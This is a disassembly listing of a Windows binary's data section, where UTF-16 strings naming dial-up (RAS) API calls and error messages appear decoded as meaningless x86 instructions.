  401ded:	add    BYTE PTR [edx+0x0],dh
  401df0:	je     0x401df2
  401df2:	arpl   WORD PTR [eax],ax
  401df4:	jne    0x401df6
  401df6:	je     0x401df8
  401df8:	and    BYTE PTR [eax],al
  401dfa:	sub    eax,0x20002d00
  401dff:	add    BYTE PTR [edx+0x0],dl
  401e02:	popa   
  401e03:	add    BYTE PTR [ebx+0x0],dh
  401e06:	inc    edi
  401e07:	add    BYTE PTR [ebp+0x0],ah
  401e0a:	je     0x401e0c
  401e0c:	inc    ebp
  401e0d:	add    BYTE PTR [esi+0x0],ch
  401e10:	je     0x401e12
  401e12:	jb     0x401e14
  401e14:	jns    0x401e16
  401e16:	push   eax
  401e17:	add    BYTE PTR [edx+0x0],dh
  401e1a:	outs   dx,DWORD PTR ds:[esi]
  401e1b:	add    BYTE PTR [eax+0x0],dh
  401e1e:	add    BYTE PTR gs:[edx+0x0],dh
  401e22:	je     0x401e24
  401e24:	imul   eax,DWORD PTR [eax],0x730065
  401e2a:	and    BYTE PTR [eax],al
  401e2c:	jb     0x401e2e
  401e2e:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  401e33:	add    BYTE PTR [edx+0x0],dh
  401e36:	outs   dx,BYTE PTR ds:[esi]
  401e37:	add    BYTE PTR [ebp+0x0],ah
  401e3a:	add    BYTE PTR fs:[eax],ah
  401e3d:	add    BYTE PTR ds:0x7500,ah
  401e43:	add    BYTE PTR [eax+eax*1],bh
  401e46:	dec    esi
  401e47:	add    BYTE PTR [ebp+0x0],dl
  401e4a:	dec    esp
  401e4b:	add    BYTE PTR [eax+eax*1+0x3e],cl
	...
  401e57:	add    BYTE PTR [edi+0x0],dl
  401e5a:	jb     0x401e5c
  401e5c:	imul   eax,DWORD PTR [eax],0x650074
  401e62:	inc    ebx
  401e63:	add    BYTE PTR [ebp+0x0],ch
  401e66:	push   eax
  401e67:	add    BYTE PTR [eax+0x0],ch
  401e6a:	outs   dx,DWORD PTR ds:[esi]
  401e6b:	add    BYTE PTR [esi+0x0],ch
  401e6e:	add    BYTE PTR gs:[edx+0x0],ah
  401e72:	outs   dx,DWORD PTR ds:[esi]
  401e73:	add    BYTE PTR [edi+0x0],ch
  401e76:	imul   eax,DWORD PTR [eax],0x45
  401e79:	add    BYTE PTR [esi+0x0],ch
  401e7c:	je     0x401e7e
  401e7e:	jb     0x401e80
  401e80:	jns    0x401e82
  401e82:	sub    BYTE PTR [eax],al
  401e84:	sub    DWORD PTR [eax],eax
  401e86:	and    BYTE PTR [eax],al
  401e88:	sub    eax,0x73002000
  401e8d:	add    BYTE PTR [edx+0x0],bh
  401e90:	dec    esp
  401e91:	add    BYTE PTR [edi+0x0],ch
  401e94:	outs   dx,BYTE PTR ds:[esi]
  401e95:	add    BYTE PTR [edi+0x0],ah
  401e98:	push   ebx
  401e99:	add    BYTE PTR [ebp+0x0],ah
  401e9c:	jb     0x401e9e
  401e9e:	jbe    0x401ea0
  401ea0:	imul   eax,DWORD PTR [eax],0x650063
  401ea6:	dec    esi
  401ea7:	add    BYTE PTR [ecx+0x0],ah
  401eaa:	ins    DWORD PTR es:[edi],dx
  401eab:	add    BYTE PTR [ebp+0x0],ah
  401eae:	and    BYTE PTR [eax],al
  401eb0:	and    BYTE PTR [eax],al
  401eb2:	imul   eax,DWORD PTR [eax],0x200073
  401eb8:	and    eax,0x2c007300
  401ebd:	add    BYTE PTR [eax],ah
  401ebf:	add    BYTE PTR [ebx+0x0],dh
  401ec2:	jp     0x401ec4
  401ec4:	inc    esi
  401ec5:	add    BYTE PTR [ebp+0x0],dh
  401ec8:	ins    BYTE PTR es:[edi],dx
  401ec9:	add    BYTE PTR [eax+eax*1+0x50],ch
  401ecd:	add    BYTE PTR [ecx+0x0],ah
  401ed0:	je     0x401ed2
  401ed2:	push   0x6f007400
  401ed7:	add    BYTE PTR [eax+0x0],dl
  401eda:	inc    edx
  401edb:	add    BYTE PTR [ebx+0x0],cl
  401ede:	and    BYTE PTR [eax],al
  401ee0:	imul   eax,DWORD PTR [eax],0x200073
  401ee6:	and    eax,0x7300
  401eeb:	add    BYTE PTR [eax],al
  401eed:	add    BYTE PTR [eax],al
  401eef:	add    BYTE PTR [edx],ch
  401ef1:	add    BYTE PTR [edx],ch
  401ef3:	add    BYTE PTR [edx],ch
  401ef5:	add    BYTE PTR [edx],ch
  401ef7:	add    BYTE PTR [edx],ch
  401ef9:	add    BYTE PTR [edx],ch
  401efb:	add    BYTE PTR [edx],ch
  401efd:	add    BYTE PTR [esi+0x0],al
  401f00:	popa   
  401f01:	add    BYTE PTR [ecx+0x0],ch
  401f04:	ins    BYTE PTR es:[edi],dx
  401f05:	add    BYTE PTR [ebp+0x0],ah
  401f08:	add    BYTE PTR fs:[eax],ah
  401f0b:	add    BYTE PTR [eax+eax*1+0x6f],dh
  401f0f:	add    BYTE PTR [eax],ah
  401f11:	add    BYTE PTR [eax+0x0],dh
  401f14:	imul   eax,DWORD PTR [eax],0x6b0063
  401f1a:	and    BYTE PTR [eax],al
  401f1c:	popa   
  401f1d:	add    BYTE PTR [eax],ah
  401f1f:	add    BYTE PTR [eax+eax*1+0x69],ah
  401f23:	add    BYTE PTR [ecx+0x0],ah
  401f26:	ins    BYTE PTR es:[edi],dx
  401f27:	add    BYTE PTR ds:0x70007500,ch
  401f2d:	add    BYTE PTR [eax],ah
  401f2f:	add    BYTE PTR [eax+eax*1+0x65],ah
  401f33:	add    BYTE PTR [esi+0x0],dh
  401f36:	imul   eax,DWORD PTR [eax],0x650063
  401f3c:	and    DWORD PTR [eax],eax
  401f3e:	and    DWORD PTR [eax],eax
  401f40:	and    DWORD PTR [eax],eax
  401f42:	and    DWORD PTR [eax],eax
  401f44:	add    BYTE PTR [eax],al
  401f46:	add    BYTE PTR [eax],al
  401f48:	sub    al,BYTE PTR [eax]
  401f4a:	sub    al,BYTE PTR [eax]
  401f4c:	sub    al,BYTE PTR [eax]
  401f4e:	sub    al,BYTE PTR [eax]
  401f50:	sub    al,BYTE PTR [eax]
  401f52:	sub    al,BYTE PTR [eax]
  401f54:	sub    al,BYTE PTR [eax]
  401f56:	inc    esi
  401f57:	add    BYTE PTR [ecx+0x0],ah
  401f5a:	imul   eax,DWORD PTR [eax],0x65006c
  401f60:	add    BYTE PTR fs:[eax],ah
  401f63:	add    BYTE PTR [eax+eax*1+0x6f],dh
  401f67:	add    BYTE PTR [eax],ah
  401f69:	add    BYTE PTR [eax+0x0],dh
  401f6c:	imul   eax,DWORD PTR [eax],0x6b0063
  401f72:	and    BYTE PTR [eax],al
  401f74:	popa   
  401f75:	add    BYTE PTR [eax],ah
  401f77:	add    BYTE PTR [esi+0x0],dl
  401f7a:	push   eax
  401f7b:	add    BYTE PTR [esi+0x0],cl
  401f7e:	and    BYTE PTR [eax],al
  401f80:	add    BYTE PTR fs:[ebp+0x0],ah
  401f84:	jbe    0x401f86
  401f86:	imul   eax,DWORD PTR [eax],0x650063
  401f8c:	and    DWORD PTR [eax],eax
  401f8e:	and    DWORD PTR [eax],eax
  401f90:	and    DWORD PTR [eax],eax
  401f92:	and    DWORD PTR [eax],eax
  401f94:	add    BYTE PTR [eax],al
  401f96:	add    BYTE PTR [eax],al
  401f98:	and    eax,0x25007300
  401f9d:	add    BYTE PTR [ebx+0x0],dh
  401fa0:	add    BYTE PTR [eax],al
  401fa2:	add    BYTE PTR [eax],al
  401fa4:	ins    DWORD PTR es:[edi],dx
  401fa5:	add    BYTE PTR [edi+0x0],ch
  401fa8:	add    BYTE PTR fs:[ebp+0x0],ah
  401fac:	ins    DWORD PTR es:[edi],dx
  401fad:	add    BYTE PTR [eax],al
  401faf:	add    BYTE PTR [ebp+0x0],dl
  401fb2:	outs   dx,BYTE PTR ds:[esi]
  401fb3:	add    BYTE PTR [ecx+0x0],ah
  401fb6:	jbe    0x401fb8
  401fb8:	popa   
  401fb9:	add    BYTE PTR [ecx+0x0],ch
  401fbc:	ins    BYTE PTR es:[edi],dx
  401fbd:	add    BYTE PTR [ecx+0x0],ah
  401fc0:	bound  eax,QWORD PTR [eax]
  401fc2:	ins    BYTE PTR es:[edi],dx
  401fc3:	add    BYTE PTR [ebp+0x0],ah
  401fc6:	and    BYTE PTR [eax],al
  401fc8:	add    BYTE PTR fs:[ebp+0x0],ah
  401fcc:	jbe    0x401fce
  401fce:	imul   eax,DWORD PTR [eax],0x650063
  401fd4:	and    BYTE PTR [eax],al
  401fd6:	sub    BYTE PTR [eax],al
  401fd8:	sub    DWORD PTR [eax],eax
  401fda:	add    BYTE PTR [eax],al
  401fdc:	add    BYTE PTR [eax],al
  401fde:	add    BYTE PTR [eax],al
  401fe0:	sub    al,BYTE PTR [eax]
  401fe2:	sub    al,BYTE PTR [eax]
  401fe4:	sub    al,BYTE PTR [eax]
  401fe6:	sub    al,BYTE PTR [eax]
  401fe8:	sub    al,BYTE PTR [eax]
  401fea:	sub    al,BYTE PTR [eax]
  401fec:	sub    al,BYTE PTR [eax]
  401fee:	push   edi
  401fef:	add    BYTE PTR [edx+0x0],dh
  401ff2:	imul   eax,DWORD PTR [eax],0x690074
  401ff8:	outs   dx,BYTE PTR ds:[esi]
  401ff9:	add    BYTE PTR [edi+0x0],ah
  401ffc:	and    BYTE PTR [eax],al
  401ffe:	jae    0x402000
  402000:	jp     0x402002
  402002:	inc    esp
  402003:	add    BYTE PTR [ebp+0x0],ah
  402006:	jbe    0x402008
  402008:	imul   eax,DWORD PTR [eax],0x650063
  40200e:	push   esp
  40200f:	add    BYTE PTR [ecx+0x0],bh
  402012:	jo     0x402014
  402014:	add    BYTE PTR gs:[eax],ah
  402017:	add    BYTE PTR ds:0x25002000,ch
  40201d:	add    BYTE PTR [ebx+0x0],dh
  402020:	and    BYTE PTR [eax],al
  402022:	popa   
  402023:	add    BYTE PTR [esi+0x0],ch
  402026:	add    BYTE PTR fs:[eax],ah
  402029:	add    BYTE PTR [ebx+0x0],dh
  40202c:	jp     0x40202e
  40202e:	inc    esp
  40202f:	add    BYTE PTR [ebp+0x0],ah
  402032:	jbe    0x402034
  402034:	imul   eax,DWORD PTR [eax],0x650063
  40203a:	dec    esi
  40203b:	add    BYTE PTR [ecx+0x0],ah
  40203e:	ins    DWORD PTR es:[edi],dx
  40203f:	add    BYTE PTR [ebp+0x0],ah
  402042:	and    BYTE PTR [eax],al
  402044:	and    eax,0x7300
  402049:	add    BYTE PTR [eax],al
  40204b:	add    BYTE PTR [eax],al
  40204d:	add    BYTE PTR [eax],al
  40204f:	add    BYTE PTR [edi+0x0],dl
  402052:	jb     0x402054
  402054:	imul   eax,DWORD PTR [eax],0x650074
  40205a:	inc    ebx
  40205b:	add    BYTE PTR [ebp+0x0],ch
  40205e:	push   eax
  40205f:	add    BYTE PTR [eax+0x0],ch
  402062:	outs   dx,DWORD PTR ds:[esi]
  402063:	add    BYTE PTR [esi+0x0],ch
  402066:	add    BYTE PTR gs:[edx+0x0],ah
  40206a:	outs   dx,DWORD PTR ds:[esi]
  40206b:	add    BYTE PTR [edi+0x0],ch
  40206e:	imul   eax,DWORD PTR [eax],0x45
  402071:	add    BYTE PTR [esi+0x0],ch
  402074:	je     0x402076
  402076:	jb     0x402078
  402078:	jns    0x40207a
  40207a:	and    BYTE PTR [eax],al
  40207c:	data16 add BYTE PTR [ecx+0x0],ah
  402080:	imul   eax,DWORD PTR [eax],0x65006c
  402086:	add    BYTE PTR fs:[eax],ah
  402089:	add    BYTE PTR [eax+eax*1+0x6f],dh
  40208d:	add    BYTE PTR [eax],ah
  40208f:	add    BYTE PTR [ecx+0x0],ah
  402092:	ins    BYTE PTR es:[edi],dx
  402093:	add    BYTE PTR [eax+eax*1+0x6f],ch
  402097:	add    BYTE PTR [ebx+0x0],ah
  40209a:	and    BYTE PTR [eax],al
  40209c:	ins    DWORD PTR es:[edi],dx
  40209d:	add    BYTE PTR [ebp+0x0],ah
  4020a0:	ins    DWORD PTR es:[edi],dx
  4020a1:	add    BYTE PTR [eax],al
  4020a3:	add    BYTE PTR [eax],al
  4020a5:	add    BYTE PTR [eax],al
  4020a7:	add    BYTE PTR [edi+0x0],dl
  4020aa:	jb     0x4020ac
  4020ac:	imul   eax,DWORD PTR [eax],0x650074
  4020b2:	inc    ebx
  4020b3:	add    BYTE PTR [ebp+0x0],ch
  4020b6:	push   eax
  4020b7:	add    BYTE PTR [eax+0x0],ch
  4020ba:	outs   dx,DWORD PTR ds:[esi]
  4020bb:	add    BYTE PTR [esi+0x0],ch
  4020be:	add    BYTE PTR gs:[edx+0x0],ah
  4020c2:	outs   dx,DWORD PTR ds:[esi]
  4020c3:	add    BYTE PTR [edi+0x0],ch
  4020c6:	imul   eax,DWORD PTR [eax],0x45
  4020c9:	add    BYTE PTR [esi+0x0],ch
  4020cc:	je     0x4020ce
  4020ce:	jb     0x4020d0
  4020d0:	jns    0x4020d2
  4020d2:	sub    BYTE PTR [eax],al
  4020d4:	sub    DWORD PTR [eax],eax
  4020d6:	and    BYTE PTR [eax],al
  4020d8:	sub    eax,0x52002000
  4020dd:	add    BYTE PTR [ecx+0x0],ah
  4020e0:	jae    0x4020e2
  4020e2:	push   ebx
  4020e3:	add    BYTE PTR [ebp+0x0],ah
  4020e6:	je     0x4020e8
  4020e8:	inc    ebp
  4020e9:	add    BYTE PTR [esi+0x0],ch
  4020ec:	je     0x4020ee
  4020ee:	jb     0x4020f0
  4020f0:	jns    0x4020f2
  4020f2:	push   eax
  4020f3:	add    BYTE PTR [edx+0x0],dh
  4020f6:	outs   dx,DWORD PTR ds:[esi]
  4020f7:	add    BYTE PTR [eax+0x0],dh
  4020fa:	add    BYTE PTR gs:[edx+0x0],dh
  4020fe:	je     0x402100
  402100:	imul   eax,DWORD PTR [eax],0x730065
  402106:	and    BYTE PTR [eax],al
  402108:	data16 add BYTE PTR [ecx+0x0],ah
  40210c:	imul   eax,DWORD PTR [eax],0x65006c
  402112:	add    BYTE PTR fs:[eax],ah
  402115:	add    BYTE PTR [edi+0x0],dh
  402118:	imul   eax,DWORD PTR [eax],0x680074
  40211e:	and    BYTE PTR [eax],al
  402120:	add    BYTE PTR gs:[edx+0x0],dh
  402124:	jb     0x402126
  402126:	outs   dx,DWORD PTR ds:[esi]
  402127:	add    BYTE PTR [edx+0x0],dh
  40212a:	and    BYTE PTR [eax],al
  40212c:	and    eax,0x6400
  402131:	add    BYTE PTR [eax],al
  402133:	add    BYTE PTR [eax],al
  402135:	add    BYTE PTR [eax],al
  402137:	add    BYTE PTR [edi+0x0],al
  40213a:	add    BYTE PTR gs:[eax+eax*1+0x52],dh
  40213f:	add    BYTE PTR [ecx+0x0],ah
  402142:	jae    0x402144
  402144:	dec    ebp
  402145:	add    BYTE PTR [edi+0x0],ch
  402148:	add    BYTE PTR fs:[ebp+0x0],ah
  40214c:	ins    DWORD PTR es:[edi],dx
  40214d:	add    BYTE PTR [ebx+0x0],dh
  402150:	sub    BYTE PTR [eax],al
  402152:	sub    DWORD PTR [eax],eax
  402154:	and    BYTE PTR [eax],al
  402156:	push   edx
  402157:	add    BYTE PTR [ecx+0x0],ah
  40215a:	jae    0x40215c
  40215c:	inc    ebp
  40215d:	add    BYTE PTR [esi+0x0],ch
  402160:	jne    0x402162
  402162:	ins    DWORD PTR es:[edi],dx
  402163:	add    BYTE PTR [eax+eax*1+0x65],al
  402167:	add    BYTE PTR [esi+0x0],dh
  40216a:	imul   eax,DWORD PTR [eax],0x650063
  402170:	jae    0x402172
  402172:	sub    BYTE PTR [eax],al
  402174:	dec    esi
  402175:	add    BYTE PTR [ebp+0x0],dl
  402178:	dec    esp
  402179:	add    BYTE PTR [eax+eax*1+0x2c],cl
  40217d:	add    BYTE PTR [eax+0x0],dh
  402180:	add    BYTE PTR fs:[edi+0x0],dh
  402184:	dec    esp
  402185:	add    BYTE PTR [ebp+0x0],ah
  402188:	outs   dx,BYTE PTR ds:[esi]
  402189:	add    BYTE PTR [eax+eax*1],ch
  40218c:	add    BYTE PTR es:[eax+eax*1+0x77],ah
  402191:	add    BYTE PTR [ebx+0x0],al
  402194:	outs   dx,BYTE PTR ds:[esi]
  402195:	add    BYTE PTR [eax+eax*1+0x29],dh
  402199:	add    BYTE PTR [eax],ah
  40219b:	add    BYTE PTR [edx+0x0],dh
  40219e:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  4021a3:	add    BYTE PTR [edx+0x0],dh
  4021a6:	outs   dx,BYTE PTR ds:[esi]
  4021a7:	add    BYTE PTR [ebx+0x0],dh
  4021aa:	and    BYTE PTR [eax],al
  4021ac:	and    eax,0x2c007500
  4021b1:	add    BYTE PTR [eax],ah
  4021b3:	add    BYTE PTR [eax+eax*1+0x77],ah
  4021b7:	add    BYTE PTR [eax+eax*1+0x65],cl
  4021bb:	add    BYTE PTR [esi+0x0],ch
  4021be:	cmp    eax,0x75002500
  4021c3:	add    BYTE PTR [eax+eax*1],ch
  4021c6:	and    BYTE PTR [eax],al
  4021c8:	add    BYTE PTR fs:[edi+0x0],dh
  4021cc:	inc    ebx
  4021cd:	add    BYTE PTR [esi+0x0],ch
  4021d0:	je     0x4021d2
  4021d2:	cmp    eax,0x75002500
  4021d7:	add    BYTE PTR [esi],ch
  4021d9:	add    BYTE PTR [eax],al
  4021db:	add    BYTE PTR [esi+0x0],dh
  4021de:	jo     0x4021e0
  4021e0:	outs   dx,BYTE PTR ds:[esi]
  4021e1:	add    BYTE PTR [eax],al
  4021e3:	add    BYTE PTR [ecx+0x0],ch
  4021e6:	jae    0x4021e8
  4021e8:	add    BYTE PTR fs:[esi+0x0],ch
  4021ec:	add    BYTE PTR [eax],al
  4021ee:	add    BYTE PTR [eax],al
  4021f0:	dec    esp
  4021f1:	add    BYTE PTR [ecx+0x0],ah
  4021f4:	jne    0x4021f6
  4021f6:	outs   dx,BYTE PTR ds:[esi]
  4021f7:	add    BYTE PTR [ebx+0x0],ah
  4021fa:	push   0x72005000
  4021ff:	add    BYTE PTR [edi+0x0],ch
  402202:	data16 add BYTE PTR [ecx+0x0],ch
  402206:	ins    BYTE PTR es:[edi],dx
  402207:	add    BYTE PTR [ebp+0x0],ah
  40220a:	and    BYTE PTR [eax],al
  40220c:	sub    eax,0x20002d00
  402211:	add    BYTE PTR [edx+0x0],dl
  402214:	popa   
  402215:	add    BYTE PTR [ebx+0x0],dh
  402218:	inc    edi
  402219:	add    BYTE PTR [ebp+0x0],ah
  40221c:	je     0x40221e
  40221e:	inc    ebp
  40221f:	add    BYTE PTR [esi+0x0],ch
  402222:	je     0x402224
  402224:	jb     0x402226
  402226:	jns    0x402228
  402228:	push   eax
  402229:	add    BYTE PTR [edx+0x0],dh
  40222c:	outs   dx,DWORD PTR ds:[esi]
  40222d:	add    BYTE PTR [eax+0x0],dh
  402230:	add    BYTE PTR gs:[edx+0x0],dh
  402234:	je     0x402236
  402236:	imul   eax,DWORD PTR [eax],0x730065
  40223c:	and    BYTE PTR [eax],al
  40223e:	jb     0x402240
  402240:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  402245:	add    BYTE PTR [edx+0x0],dh
  402248:	outs   dx,BYTE PTR ds:[esi]
  402249:	add    BYTE PTR [ebp+0x0],ah
  40224c:	add    BYTE PTR fs:[eax],ah
  40224f:	add    BYTE PTR ds:0x7500,ah
  402255:	add    BYTE PTR [eax],al
  402257:	add    BYTE PTR [esi+0x0],ch
  40225a:	add    BYTE PTR gs:[eax+eax*1+0x73],dh
  40225f:	add    BYTE PTR [eax+0x0],ch
  402262:	add    BYTE PTR gs:[eax+eax*1+0x6c],ch
  402267:	add    BYTE PTR [esi],ch
  402269:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40226d:	add    BYTE PTR [eax+eax*1+0x0],ch
  402271:	add    BYTE PTR [eax],al
  402273:	add    BYTE PTR [eax+0x72],cl
  402276:	dec    esp
  402277:	popa   
  402278:	jne    0x4022e8
  40227a:	arpl   WORD PTR [eax+0x43],bp
  40227d:	outs   dx,DWORD PTR ds:[esi]
  40227e:	outs   dx,BYTE PTR ds:[esi]
  40227f:	outs   dx,BYTE PTR ds:[esi]
  402280:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402285:	outs   dx,BYTE PTR ds:[esi]
  402286:	add    BYTE PTR [eax],al
  402288:	dec    eax
  402289:	jb     0x4022ce
  40228b:	jb     0x4022f2
  40228d:	popa   
  40228e:	je     0x4022f5
  402290:	inc    esp
  402291:	gs jae 0x4022ff
  402294:	je     0x402305
  402296:	jo     0x4022e1
  402298:	arpl   WORD PTR [edi+0x6e],bp
  40229b:	add    BYTE PTR [eax+0x72],cl
  40229e:	dec    esp
  40229f:	popa   
  4022a0:	jne    0x402310
  4022a2:	arpl   WORD PTR [eax+0x43],bp
  4022a5:	outs   dx,DWORD PTR ds:[esi]
  4022a6:	outs   dx,BYTE PTR ds:[esi]
  4022a7:	outs   dx,BYTE PTR ds:[esi]
  4022a8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4022ad:	outs   dx,BYTE PTR ds:[esi]
  4022ae:	inc    ebp
  4022af:	js     0x4022b1
  4022b1:	add    BYTE PTR [eax],al
  4022b3:	add    BYTE PTR [edx+0x0],dh
  4022b6:	popa   
  4022b7:	add    BYTE PTR [ebx+0x0],dh
  4022ba:	popa   
  4022bb:	add    BYTE PTR [eax+0x0],dh
  4022be:	imul   eax,DWORD PTR [eax],0x320033
  4022c4:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  4022c9:	add    BYTE PTR [eax+eax*1+0x0],ch
  4022cd:	add    BYTE PTR [eax],al
  4022cf:	add    BYTE PTR [edx+0x61],dl
  4022d2:	jae    0x402318
  4022d4:	gs ins BYTE PTR es:[edi],dx
  4022d6:	gs je  0x40233e
  4022d9:	inc    ebp
  4022da:	outs   dx,BYTE PTR ds:[esi]
  4022db:	je     0x40234f
  4022dd:	jns    0x402336
  4022df:	add    BYTE PTR [edx+0x61],dl
  4022e2:	jae    0x402329
  4022e4:	outs   dx,BYTE PTR ds:[esi]
  4022e5:	jne    0x402354
  4022e7:	inc    ebp
  4022e8:	outs   dx,BYTE PTR ds:[esi]
  4022e9:	je     0x40235d
  4022eb:	imul   esp,DWORD PTR [ebp+0x73],0x61520057
  4022f2:	jae    0x402347
  4022f4:	gs je  0x40233c
  4022f7:	outs   dx,BYTE PTR ds:[esi]
  4022f8:	je     0x40236c
  4022fa:	jns    0x40234c
  4022fc:	jb     0x40236d
  4022fe:	jo     0x402365
  402300:	jb     0x402376
  402302:	imul   esp,DWORD PTR [ebp+0x73],0x52000057
  402309:	popa   
  40230a:	jae    0x402351
  40230c:	outs   dx,BYTE PTR ds:[esi]
  40230d:	jne    0x40237c
  40230f:	inc    esp
  402310:	gs jbe 0x40237c
  402313:	arpl   WORD PTR [ebp+0x73],sp
  402316:	push   edi
  402317:	add    BYTE PTR [edx+0x61],dl
  40231a:	jae    0x402363
  40231c:	gs je  0x402364
  40231f:	outs   dx,BYTE PTR ds:[esi]
  402320:	je     0x402394
  402322:	jns    0x402374
  402324:	jb     0x402395
  402326:	jo     0x40238d
  402328:	jb     0x40239e
  40232a:	imul   esp,DWORD PTR [ebp+0x73],0x52000057
  402331:	popa   
  402332:	jae    0x402387
  402334:	gs je  0x40237a
  402337:	jb     0x40239e
  402339:	fs outs dx,BYTE PTR gs:[esi]
  40233c:	je     0x4023a7
  40233e:	popa   
  40233f:	ins    BYTE PTR es:[edi],dx
  402340:	jae    0x402399
  402342:	add    BYTE PTR [eax],al
  402344:	push   ebx
  402345:	dec    eax
  402346:	inc    edi
  402347:	gs je  0x402390
  40234a:	outs   dx,DWORD PTR ds:[esi]
  40234b:	ins    BYTE PTR es:[edi],dx
  40234c:	fs gs jb 0x4023a0
  402350:	popa   
  402351:	je     0x4023bb
  402353:	push   edi
  402354:	add    BYTE PTR [eax],al
  402356:	add    BYTE PTR [eax],al
  402358:	push   ebx
  402359:	dec    eax
  40235a:	inc    edi
  40235b:	gs je  0x4023b1
  40235e:	jo     0x4023c5
  402360:	arpl   WORD PTR [ecx+0x61],bp
  402363:	ins    BYTE PTR es:[edi],dx
  402364:	inc    esi
  402365:	outs   dx,DWORD PTR ds:[esi]
  402366:	ins    BYTE PTR es:[edi],dx
  402367:	fs gs jb 0x4023bb
  40236b:	popa   
  40236c:	je     0x4023d6
  40236e:	push   edi
  40236f:	add    BYTE PTR [ebx+0x0],dh
  402372:	push   0x6c006500
  402377:	add    BYTE PTR [eax+eax*1+0x33],ch
  40237b:	add    BYTE PTR [edx],dh
  40237d:	add    BYTE PTR [esi],ch
  40237f:	add    BYTE PTR [eax+eax*1+0x6c],ah
  402383:	add    BYTE PTR [eax+eax*1+0x0],ch
  402387:	add    BYTE PTR [ebx+0x0],dl
  40238a:	je     0x40238c
  40238c:	jb     0x40238e
  40238e:	imul   eax,DWORD PTR [eax],0x67006e
  402394:	inc    ebx
  402395:	add    BYTE PTR [ebx+0x0],ah
  402398:	push   0x65004c00
  40239d:	add    BYTE PTR [esi+0x0],ch
  4023a0:	add    BYTE PTR [si+0x0],dh
  4023a4:	push   0x66002000
  4023a9:	add    BYTE PTR [ecx+0x0],ah
  4023ac:	imul   eax,DWORD PTR [eax],0x65006c
  4023b2:	add    BYTE PTR fs:[eax],ah
  4023b5:	add    BYTE PTR [edi+0x0],dh
  4023b8:	imul   eax,DWORD PTR [eax],0x680074
  4023be:	and    BYTE PTR [eax],al
  4023c0:	inc    ebp
  4023c1:	add    BYTE PTR [edx+0x0],dh
  4023c4:	jb     0x4023c6
  4023c6:	outs   dx,DWORD PTR ds:[esi]
  4023c7:	add    BYTE PTR [edx+0x0],dh
  4023ca:	and    BYTE PTR [eax],al
  4023cc:	and    eax,0xa007800
  4023d1:	add    BYTE PTR [eax],al
  4023d3:	add    BYTE PTR [eax],al
  4023d5:	add    BYTE PTR [eax],al
  4023d7:	add    BYTE PTR [ebx+0x0],dl
  4023da:	dec    eax
  4023db:	add    BYTE PTR [edi+0x0],al
  4023de:	add    BYTE PTR gs:[eax+eax*1+0x46],dh
  4023e3:	add    BYTE PTR [edi+0x0],ch
  4023e6:	ins    BYTE PTR es:[edi],dx
  4023e7:	add    BYTE PTR [eax+eax*1+0x65],ah
  4023eb:	add    BYTE PTR [edx+0x0],dh
  4023ee:	push   eax
  4023ef:	add    BYTE PTR [ecx+0x0],ah
  4023f2:	je     0x4023f4
  4023f4:	push   0x66002000
  4023f9:	add    BYTE PTR [ecx+0x0],ah
  4023fc:	imul   eax,DWORD PTR [eax],0x65006c
  402402:	add    BYTE PTR fs:[eax],ah
  402405:	add    BYTE PTR [edi+0x0],dh
  402408:	imul   eax,DWORD PTR [eax],0x680074
  40240e:	and    BYTE PTR [eax],al
  402410:	inc    ebp
  402411:	add    BYTE PTR [edx+0x0],dh
  402414:	jb     0x402416
  402416:	outs   dx,DWORD PTR ds:[esi]
  402417:	add    BYTE PTR [edx+0x0],dh
  40241a:	cmp    al,BYTE PTR [eax]
  40241c:	and    BYTE PTR [eax],al
  40241e:	and    eax,0xa007800
  402423:	add    BYTE PTR [eax],al
  402425:	add    BYTE PTR [eax],al
  402427:	add    BYTE PTR [ebx+0x0],dl
  40242a:	je     0x40242c
  40242c:	jb     0x40242e
  40242e:	imul   eax,DWORD PTR [eax],0x67006e
  402434:	inc    ebx
  402435:	add    BYTE PTR [ebx+0x0],ah
  402438:	push   0x65004c00
  40243d:	add    BYTE PTR [esi+0x0],ch
  402440:	add    BYTE PTR [si+0x0],dh
  402444:	push   0x66002000
  402449:	add    BYTE PTR [ecx+0x0],ah
  40244c:	imul   eax,DWORD PTR [eax],0x65006c
  402452:	add    BYTE PTR fs:[eax],ah
  402455:	add    BYTE PTR [edi+0x0],dh
  402458:	imul   eax,DWORD PTR [eax],0x680074
  40245e:	and    BYTE PTR [eax],al
  402460:	inc    ebp
  402461:	add    BYTE PTR [edx+0x0],dh
  402464:	jb     0x402466
  402466:	outs   dx,DWORD PTR ds:[esi]
  402467:	add    BYTE PTR [edx+0x0],dh
  40246a:	cmp    al,BYTE PTR [eax]
  40246c:	and    BYTE PTR [eax],al
  40246e:	and    eax,0xa007800
  402473:	add    BYTE PTR [eax],al
  402475:	add    BYTE PTR [eax],al
  402477:	add    BYTE PTR [ebx+0x0],dl
  40247a:	outs   dx,DWORD PTR ds:[esi]
  40247b:	add    BYTE PTR [ebp+0x0],ch
  40247e:	add    BYTE PTR gs:[eax+eax*1+0x68],dh
  402483:	add    BYTE PTR [ecx+0x0],ch
  402486:	outs   dx,BYTE PTR ds:[esi]
  402487:	add    BYTE PTR [edi+0x0],ah
  40248a:	and    BYTE PTR [eax],al
  40248c:	jae    0x40248e
  40248e:	add    BYTE PTR gs:[edx+0x0],dh
  402492:	imul   eax,DWORD PTR [eax],0x75006f
  402498:	jae    0x40249a
  40249a:	ins    BYTE PTR es:[edi],dx
  40249b:	add    BYTE PTR [ecx+0x0],bh
  40249e:	and    BYTE PTR [eax],al
  4024a0:	ja     0x4024a2
  4024a2:	jb     0x4024a4
  4024a4:	outs   dx,DWORD PTR ds:[esi]
  4024a5:	add    BYTE PTR [esi+0x0],ch
  4024a8:	add    BYTE PTR ds:0x2000,ch
  4024ad:	add    BYTE PTR [eax+eax*1+0x68],dl
  4024b1:	add    BYTE PTR [ebp+0x0],ah
  4024b4:	and    BYTE PTR [eax],al
  4024b6:	popa   
  4024b7:	add    BYTE PTR [eax+0x0],dh
  4024ba:	jo     0x4024bc
  4024bc:	add    BYTE PTR fs:[ecx+0x0],ah
  4024c0:	je     0x4024c2
  4024c2:	popa   
  4024c3:	add    BYTE PTR [eax],ah
  4024c5:	add    BYTE PTR [esi+0x0],ah
  4024c8:	outs   dx,DWORD PTR ds:[esi]
